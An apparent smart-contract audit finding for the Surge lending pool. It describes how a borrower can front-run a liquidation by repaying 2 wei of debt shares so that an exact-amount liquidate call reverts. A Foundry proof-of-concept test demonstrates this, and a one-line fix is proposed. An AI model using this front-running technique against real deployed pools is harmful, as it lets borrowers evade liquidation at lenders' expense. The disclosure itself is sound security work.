# users can avoid getting liquidated if the liquidator sends the exact amount of debt

## Summary
users can avoid getting liquidated if the liquidator sends the exact amount of debt  

## Vulnerability Detail
the `liquidate` function takes the exact amount of liquidation the borrower can front-run liquidate calls and pays a small amount of debt and the liquidate call will revert due to under/over, flow of `debtSharesBalanceOf`

also, a front-run attack test that you can add to `Pool.t.sol`
```solidity
function testAttack2() public {
        address borrower = address(0xDD);

        uint amount = 1e18;
        uint borrowAmount = amount / 2;
        MockERC20 collateralToken = new MockERC20(amount, 18);
        MockERC20 loanToken = new MockERC20(amount * 3, 18);
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 1e18, 0.5e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);
        loanToken.approve(address(pool), type(uint).max);
        pool.deposit(amount);
        collateralToken.transfer(borrower, borrowAmount+100);

        vm.startPrank(borrower);
        { // BORROWER TXS // one year ago...
            collateralToken.approve(address(pool), type(uint).max);
            loanToken.approve(address(pool), type(uint).max);
            pool.addCollateral(borrower, borrowAmount);
            pool.borrow(borrowAmount);
            vm.warp(block.timestamp + 365 days);
            pool.withdraw(0);
        }
        vm.stopPrank();

        uint debtAmount = pool.lastTotalDebt();

        emit log_named_uint("debt", pool.debtSharesBalanceOf(borrower));
        vm.startPrank(borrower);
        { // BORROWER TXS => front-running tx 0
            pool.repay(borrower, 2); // 1wei of shares 
        }
        vm.stopPrank();
        emit log_named_uint("debt", pool.debtSharesBalanceOf(borrower));


        vm.expectRevert();
        // original liquidation transaction :: TX 0 
        pool.liquidate(borrower, debtAmount); // REVERTS

    }
```

as you can see it will revert with only repaying `2 wei` of shares

## Impact
a borrower can revert his/her liquidation calls

## Tool used

Manual Review, forge

## Recommendation
solving this problem is possible by changing this condition on line `Pool.sol#L580`
```solidity
-        if(_amount == type(uint).max || _amount == userDebt) {
+        if(_amount == type(uint).max || _amount >= userDebt) {
```
